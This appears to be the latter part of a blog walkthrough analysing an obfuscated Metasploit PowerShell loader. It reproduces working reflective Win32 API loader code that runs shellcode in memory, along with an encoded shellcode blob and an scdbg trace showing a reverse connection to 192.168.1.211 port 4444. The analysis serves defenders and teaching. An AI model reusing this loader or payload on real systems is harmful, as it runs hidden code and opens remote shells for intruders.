if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kU65 kernel32.dll VirtualProtect), (vA7xY @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($ejkLV, [Uint32]$eZ.Length, 0x10, [Ref]$jd)) -eq $true) {
        $s90D = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kU65 kernel32.dll CreateThread), (vA7xY @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ejkLV,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((kU65 kernel32.dll WaitForSingleObject), (vA7xY @([IntPtr], [Int32]))).Invoke($s90D,0xffffffff) | Out-Null
}

```

Anyway, We've made progress, but there's still some obfuscated logic to unravel. We'll continue to make sense of it step by step. 🕵️‍♂️🔍

The initial function, named `kU65` including function and variable names appear obfuscated

```powershell
function kU65 {
        Param ($hGNev, $uhDnq)
        $jP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jP.GetMethod('GetModuleHandle')).Invoke($null, @($hGNev)))), $uhDnq))
}

```

The `kU65` function serves a critical role in this code. It accepts two parameters and uses a technique known as "reflection" to dynamically search for the memory address of Win32 API calls. This technique grants PowerShell the capability to execute core, low-level procedures crucial to interacting with the operating system.

This capability empowers PowerShell to perform various tasks, including memory allocation, memory manipulation, and more, as we'll see in the subsequent code.

```powershell
function vA7xY {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $mfQ,
                [Parameter(Position = 1)] [Type] $uK = [Void]
        )

        $rvBb = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $rvBb.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $mfQ).SetImplementationFlags('Runtime, Managed')
        $rvBb.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uK, $mfQ).SetImplementationFlags('Runtime, Managed')

        return $rvBb.CreateType()
}

```

these functions enable the interpretation of Win32 API function parameters and return values which is crafted by MSF to locate and access Win32 API functions using PowerShell.

After defining those crucial functions, this segment of PowerShell code proceeds to create an array of bytes. These bytes are extracted by decoding yet another layer of Base64 encoding. The use of multiple layers of encoding serves as an obfuscation technique, making it more challenging for anyone inspecting the code to quickly discern its purpose.

```powershell
[Byte[]]$eZ = [System.Convert]::FromBase64String("/OiPAAAAYyF/................................./1QHDKcZ17sM=")

```

Decoding this [Base64](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=L09pUEFBQUFZREhTaWVWa2kxSXdpMUlNaTFJVUQ3ZEtKb3R5S0RIL01jQ3NQR0Y4QWl3Z3djOE5BY2RKZGU5U2kxSVFWNHRDUEFIUWkwQjRoY0IwVEFIUVVJdElHSXRZSUFIVGhjbDBQREgvU1lzMGl3SFdNY0RCencyc0FjYzQ0SFgwQTMzNE8zMGtkZUJZaTFna0FkTm1pd3hMaTFnY0FkT0xCSXNCMElsRUpDUmJXMkZaV2xILzRGaGZXb3NTNllELy8vOWRhRE15QUFCb2QzTXlYMVJvVEhjbUI0bm8vOUM0a0FFQUFDbkVWRkJvS1lCckFQL1ZhZ3Bvd0tnQjAyZ0NBQkZjaWVaUVVGQlFRRkJBVUdqcUQ5L2cvOVdYYWhCV1YyaVpwWFJoLzlXRndIUU0vMDRJZGV4bzhMV2lWdi9WYWdCcUJGWlhhQUxaeUYvLzFZczJha0JvQUJBQUFGWnFBR2hZcEZQbC85V1RVMm9BVmxOWGFBTFp5Ri8vMVFIREtjWjE3c009) unfortunately gives us a lot of non-printable characters.

Indicating that it's likely shellcode. Shellcode consists of processor instructions, often used for malicious purposes, and is typically not human-readable. To analyze this shellcode, you can download it to your current environment and use a tool like scdbg for further analysis.

```
C:\\Users\\condor\\Downloads\\scdbg>scdbg.exe /f download.dat
Loaded 128 bytes from file download.dat
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4010aa  LoadLibraryA(ws2_32)
4010ba  WSAStartup(190)
4010d7  WSASocket(af=2, tp=1, proto=0, group=0, flags=0)
4010e3  connect(h=42, host: 192.168.1.211 , port: 4444 ) = 71ab4a07
401100  recv(h=42, buf=12fc5c, len=4, fl=0)
        Allocation (5c110002) > MAX_ALLOC adjusting...
401113  VirtualAlloc(base=0 , sz=1000000) = 600000
        len being reset to 4096 from 5c110002
401121  recv(h=42, buf=600000, len=1000, fl=0)

Stepcount 2000001

```

Boom! 🧨💥 You've successfully identified the malicious behavior. The compromised host is attempting to connect to a remote host at IP address 192.168.1.211 on port 4444, and it's performing memory allocations using `VirtualAlloc`. This kind of behavior is a strong indicator of malicious activity and may require further investigation and mitigation.

### Conclusion

Red teamers play a vital role in emulating real-world adversaries, helping organizations identify vulnerabilities, and testing the resilience of their security measures. Simulating such attacks, like the one discussed in this article, allows for the evaluation of detection and response capabilities, ultimately leading to the refinement of security postures.

On the flip side, blue teamers must leverage their knowledge of attack techniques to fortify defenses and develop robust incident response strategies. They must stay ahead of adversaries by employing advanced detection tools, conducting thorough log and network analysis, and practicing diligent threat hunting.

Effective collaboration between red and blue teams is the linchpin of a strong cybersecurity ecosystem. This collaboration ensures that organizations are better prepared to detect, respond to, and mitigate the ever-evolving threats that persist in the digital landscape. By continually honing their skills, sharing knowledge, and working together, red and blue teamers contribute significantly to the ongoing battle against cyber threats, ultimately making our digital world safer for all.
